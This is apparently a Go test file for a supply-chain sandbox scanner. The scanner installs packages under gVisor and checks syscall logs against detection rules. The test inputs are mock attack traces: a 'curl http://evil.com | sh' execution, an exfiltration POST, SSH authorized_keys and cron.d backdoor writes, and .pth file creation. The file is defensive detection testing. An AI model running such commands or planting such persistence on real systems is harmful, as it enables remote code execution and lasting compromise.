package sandbox

import (
	"context"
	"encoding/json"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/sync/semaphore"

	"github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSandboxScanner_Name_ReturnsSandbox(t *testing.T) {
	s := &SandboxScanner{}
	assert.Equal(t, "sandbox", s.Name())
}

func TestSandboxScanner_SupportedEcosystems(t *testing.T) {
	s := &SandboxScanner{
		baseImages: map[scanner.Ecosystem]string{
			scanner.EcosystemPyPI:     "python:3.12-slim",
			scanner.EcosystemNPM:      "node:20-slim",
			scanner.EcosystemNuGet:    "mcr.microsoft.com/dotnet/sdk:8.0",
			scanner.EcosystemMaven:    "maven:3-eclipse-temurin-21",
			scanner.EcosystemRubyGems: "ruby:3.3-slim",
		},
	}

	ecosystems := s.SupportedEcosystems()
	assert.Len(t, ecosystems, 5)
	assert.Contains(t, ecosystems, scanner.EcosystemPyPI)
	assert.Contains(t, ecosystems, scanner.EcosystemNPM)
	assert.Contains(t, ecosystems, scanner.EcosystemNuGet)
	assert.Contains(t, ecosystems, scanner.EcosystemMaven)
	assert.Contains(t, ecosystems, scanner.EcosystemRubyGems)

	// Go ecosystem should NOT be supported (no install hooks).
	assert.NotContains(t, ecosystems, scanner.EcosystemGo)
	// Docker should NOT be supported.
	assert.NotContains(t, ecosystems, scanner.EcosystemDocker)
}

func TestSandboxScanner_ParseBehaviorLog_DetectsExfiltration(t *testing.T) {
	logData := strings.Join([]string{
		`connect(3, addr=1.2.3.4:443) write(3, "POST /exfil HTTP/1.1\r\n"...)`,
	}, "\n")

	rules := defaultRules()
	findings := analyzeLog(logData, rules, defaultForkThreshold)

	require.NotEmpty(t, findings)
	found := false
	for _, f := range findings {
		if f.Category == "sandbox:http-post-external" {
			found = true
			assert.Equal(t, scanner.SeverityCritical, f.Severity)
			break
		}
	}
	assert.True(t, found, "expected http-post-external finding")
}

func TestSandboxScanner_ParseBehaviorLog_Clean(t *testing.T) {
	logData := strings.Join([]string{
		`read(3, "hello world", 1024)`,
		`write(1, "installing package...\n", 23)`,
		`close(3)`,
	}, "\n")

	rules := defaultRules()
	findings := analyzeLog(logData, rules, defaultForkThreshold)

	assert.Empty(t, findings, "clean log should produce no findings")
}

func TestSandboxScanner_Timeout_ReturnsUnknown(t *testing.T) {
	// With no real runsc, the scan should fail and return "unknown" (VerdictSuspicious with error).
	s := &SandboxScanner{
		runtimeBinary: "/nonexistent/runsc",
		timeout:       100 * time.Millisecond,
		networkPolicy: "none",
		maxConcurrent: 1,
		semaphore:     newTestSemaphore(1),
		baseImages: map[scanner.Ecosystem]string{
			scanner.EcosystemPyPI: "python:3.12-slim",
		},
		rules:         defaultRules(),
		forkThreshold: defaultForkThreshold,
	}

	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()

	result := s.scan(ctx, scanner.Artifact{
		ID:        "pypi:test-pkg:1.0.0",
		Ecosystem: scanner.EcosystemPyPI,
		LocalPath: "/tmp/nonexistent.tar.gz",
	}, "/tmp/nonexistent.tar.gz")

	// Should fail gracefully — VerdictSuspicious (our "unknown") with error.
	assert.Equal(t, verdictUnknown(), result.Verdict)
	assert.Error(t, result.Error)
	assert.Equal(t, "sandbox", result.ScannerID)
}

func TestBehaviorRules_AllPatternsCompile(t *testing.T) {
	rules := defaultRules()
	require.NotEmpty(t, rules, "should have at least one rule")
	for _, rule := range rules {
		assert.NotNil(t, rule.Pattern, "rule %s has nil pattern", rule.Name)
		assert.NotEmpty(t, rule.Name, "rule has empty name")
		assert.NotEmpty(t, rule.Description, "rule %s has empty description", rule.Name)
	}
}

func TestBehaviorRules_DNSExfiltration(t *testing.T) {
	logData := `connect(5, addr=8.8.8.8:53)`

	rules := defaultRules()
	findings := analyzeLog(logData, rules, defaultForkThreshold)

	require.NotEmpty(t, findings)
	found := false
	for _, f := range findings {
		if f.Category == "sandbox:dns-non-registry" {
			found = true
			assert.Equal(t, scanner.SeverityHigh, f.Severity)
			break
		}
	}
	assert.True(t, found, "expected dns-non-registry finding")
}

func TestBehaviorRules_SSHWrite(t *testing.T) {
	logData := `openat(AT_FDCWD, "/root/.ssh/authorized_keys", O_WRONLY|O_CREAT, 0644) = 4`

	rules := defaultRules()
	findings := analyzeLog(logData, rules, defaultForkThreshold)

	require.NotEmpty(t, findings)
	found := false
	for _, f := range findings {
		if f.Category == "sandbox:ssh-config-write" {
			found = true
			assert.Equal(t, scanner.SeverityCritical, f.Severity)
			break
		}
	}
	assert.True(t, found, "expected ssh-config-write finding")
}

func TestBehaviorRules_PthCreation(t *testing.T) {
	logData := `openat(AT_FDCWD, "/usr/lib/python3.12/site-packages/malicious.pth", O_CREAT|O_WRONLY, 0644) = 5`

	rules := defaultRules()
	findings := analyzeLog(logData, rules, defaultForkThreshold)

	require.NotEmpty(t, findings)
	found := false
	for _, f := range findings {
		if f.Category == "sandbox:pth-file-creation" {
			found = true
			assert.Equal(t, scanner.SeverityCritical, f.Severity)
			break
		}
	}
	assert.True(t, found, "expected pth-file-creation finding")
}

func TestBehaviorRules_ShellExecution(t *testing.T) {
	logData := `execve("/bin/sh", ["sh", "-c", "curl http://evil.com | sh"], ...)`

	rules := defaultRules()
	findings := analyzeLog(logData, rules, defaultForkThreshold)

	require.NotEmpty(t, findings)
	found := false
	for _, f := range findings {
		if f.Category == "sandbox:shell-execution" {
			found = true
			assert.Equal(t, scanner.SeverityHigh, f.Severity)
			break
		}
	}
	assert.True(t, found, "expected shell-execution finding")
}

func TestBehaviorRules_CronCreation(t *testing.T) {
	logData := `openat(AT_FDCWD, "/etc/cron.d/backdoor", O_CREAT|O_WRONLY, 0644) = 6`

	rules := defaultRules()
	findings := analyzeLog(logData, rules, defaultForkThreshold)

	require.NotEmpty(t, findings)
	found := false
	for _, f := range findings {
		if f.Category == "sandbox:cron-job-creation" {
			found = true
			assert.Equal(t, scanner.SeverityCritical, f.Severity)
			break
		}
	}
	assert.True(t, found, "expected cron-job-creation finding")
}

func TestBehaviorRules_ExcessiveForking(t *testing.T) {
	// Generate 12 clone() calls (threshold is 10, so should trigger at 11th).
	var lines []string
	for i := 0; i < 12; i++ {
		lines = append(lines, `clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD, child_tidptr=0x7f...) = 12345`)
	}
	logData := strings.Join(lines, "\n")

	rules := defaultRules()
	findings := analyzeLog(logData, rules, defaultForkThreshold)

	require.NotEmpty(t, findings)
	forkFindings := 0
	for _, f := range findings {
		if f.Category == "sandbox:excessive-forking" {
			forkFindings++
		}
	}
	// Should produce exactly one finding (reported once when threshold exceeded).
	assert.Equal(t, 1, forkFindings, "should report excessive forking exactly once")
}

func TestBehaviorRules_BelowForkThreshold_NoFinding(t *testing.T) {
	var lines []string
	for i := 0; i < 5; i++ {
		lines = append(lines, `clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD, child_tidptr=0x7f...) = 12345`)
	}
	logData := strings.Join(lines, "\n")

	rules := defaultRules()
	findings := analyzeLog(logData, rules, defaultForkThreshold)

	for _, f := range findings {
		assert.NotEqual(t, "sandbox:excessive-forking", f.Category, "should not report forking below threshold")
	}
}

func TestFindingsToVerdict_NoFindings_Clean(t *testing.T) {
	verdict, confidence := findingsToVerdict(nil)
	assert.Equal(t, scanner.VerdictClean, verdict)
	assert.Equal(t, float32(1.0), confidence)
}

func TestFindingsToVerdict_CriticalFinding_Malicious(t *testing.T) {
	findings := []scanner.Finding{
		{Severity: scanner.SeverityCritical, Category: "sandbox:ssh-config-write"},
	}
	verdict, confidence := findingsToVerdict(findings)
	assert.Equal(t, scanner.VerdictMalicious, verdict)
	assert.Equal(t, float32(0.9), confidence)
}

func TestFindingsToVerdict_HighFinding_Malicious(t *testing.T) {
	findings := []scanner.Finding{
		{Severity: scanner.SeverityHigh, Category: "sandbox:dns-non-registry"},
	}
	verdict, confidence := findingsToVerdict(findings)
	assert.Equal(t, scanner.VerdictMalicious, verdict)
	assert.Equal(t, float32(0.8), confidence)
}

func TestFindingsToVerdict_MediumOnly_Suspicious(t *testing.T) {
	findings := []scanner.Finding{
		{Severity: scanner.SeverityMedium, Category: "sandbox:env-read"},
	}
	verdict, confidence := findingsToVerdict(findings)
	assert.Equal(t, scanner.VerdictSuspicious, verdict)
	assert.Equal(t, float32(0.7), confidence)
}

func TestInstallCommand_PyPI(t *testing.T) {
	cmd := installCommand(scanner.EcosystemPyPI, "/artifact.tar.gz")
	assert.Equal(t, []string{"pip", "install", "--no-deps", "/artifact.tar.gz"}, cmd)
}

func TestInstallCommand_NPM(t *testing.T) {
	cmd := installCommand(scanner.EcosystemNPM, "/artifact.tgz")
	assert.Equal(t, []string{"npm", "install", "/artifact.tgz"}, cmd)
}

func TestInstallCommand_NuGet(t *testing.T) {
	cmd := installCommand(scanner.EcosystemNuGet, "/packages/artifact.nupkg")
	assert.Equal(t, []string{"dotnet", "add", "package", "--source", "/packages"}, cmd)
}

func TestInstallCommand_Maven(t *testing.T) {
	cmd := installCommand(scanner.EcosystemMaven, "/artifact.jar")
	assert.Equal(t, []string{"mvn", "install:install-file", "-Dfile=/artifact.jar"}, cmd)
}

func TestInstallCommand_RubyGems(t *testing.T) {
	cmd := installCommand(scanner.EcosystemRubyGems, "/artifact.gem")
	assert.Equal(t, []string{"gem", "install", "/artifact.gem", "--local"}, cmd)
}

func TestInstallCommand_Go_ReturnsNil(t *testing.T) {
	cmd := installCommand(scanner.EcosystemGo, "/artifact.zip")
	assert.Nil(t, cmd, "Go ecosystem should not have an install command")
}

func TestInstallCommand_Docker_ReturnsNil(t *testing.T) {
	cmd := installCommand(scanner.EcosystemDocker, "/image.tar")
	assert.Nil(t, cmd, "Docker ecosystem should not have an install command")
}

func TestScanAsync_NonBlocking(t *testing.T) {
	s := &SandboxScanner{
		runtimeBinary: "/nonexistent/runsc",
		timeout:       100 * time.Millisecond,
		networkPolicy: "none",
		maxConcurrent: 1,
		semaphore:     newTestSemaphore(1),
		baseImages: map[scanner.Ecosystem]string{
			scanner.EcosystemPyPI: "python:3.12-slim",
		},
		rules:         defaultRules(),
		forkThreshold: defaultForkThreshold,
	}

	var wg sync.WaitGroup
	wg.Add(1)

	var result scanner.ScanResult
	s.ScanAsync(context.Background(), scanner.Artifact{
		ID:        "pypi:test:1.0",
		Ecosystem: scanner.EcosystemPyPI,
		LocalPath: "/tmp/nonexistent.tar.gz",
	}, "/tmp/nonexistent.tar.gz", func(r scanner.ScanResult) {
		result = r
		wg.Done()
	})

	// ScanAsync should return immediately (non-blocking).
	// Wait for the callback with a timeout.
	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		// Callback was invoked.
		assert.Equal(t, "sandbox", result.ScannerID)
	case <-time.After(5 * time.Second):
		t.Fatal("ScanAsync callback was not invoked within timeout")
	}
}

func TestSupportsEcosystem(t *testing.T) {
	s := &SandboxScanner{
		baseImages: map[scanner.Ecosystem]string{
			scanner.EcosystemPyPI: "python:3.12-slim",
			scanner.EcosystemNPM:  "node:20-slim",
		},
	}

	assert.True(t, s.supportsEcosystem(scanner.EcosystemPyPI))
	assert.True(t, s.supportsEcosystem(scanner.EcosystemNPM))
	assert.False(t, s.supportsEcosystem(scanner.EcosystemDocker))
	assert.False(t, s.supportsEcosystem(scanner.EcosystemGo))
}

func TestWriteOCISpec(t *testing.T) {
	tmpDir := t.TempDir()
	specPath := tmpDir + "/config.json"

	err := writeOCISpec(specPath, scanner.EcosystemPyPI, "none")
	require.NoError(t, err)

	// Verify the file was created and is valid JSON.
	raw, err := os.ReadFile(specPath)
	require.NoError(t, err)

	var spec ociSpec
	require.NoError(t, json.Unmarshal(raw, &spec))

	assert.Equal(t, "1.0.2", spec.OCIVersion)
	assert.Equal(t, int64(512*1024*1024), spec.Linux.Resources.Memory.Limit)
	assert.Equal(t, 100, spec.Linux.Resources.Pids.Limit)
}

func TestVerdictUnknown(t *testing.T) {
	// verdictUnknown uses VerdictSuspicious as a proxy for "unknown".
	v := verdictUnknown()
	assert.Equal(t, scanner.VerdictSuspicious, v)
}

func TestNewSandboxScanner_InvalidNetworkPolicy(t *testing.T) {
	// This test doesn't need a real runsc binary — it should fail on validation.
	_, err := NewSandboxScanner(SandboxConfig{
		Enabled:       true,
		RuntimeBinary: "/bin/echo", // exists but not runsc — we test network_policy validation first
		NetworkPolicy: "full",
	})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "network_policy")
}

func TestNewSandboxScanner_InvalidTimeout(t *testing.T) {
	_, err := NewSandboxScanner(SandboxConfig{
		Enabled:       true,
		RuntimeBinary: "/bin/echo",
		Timeout:       "not-a-duration",
	})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "timeout")
}

// --- helpers ---

func newTestSemaphore(n int) *semaphore.Weighted {
	return semaphore.NewWeighted(int64(n))
}
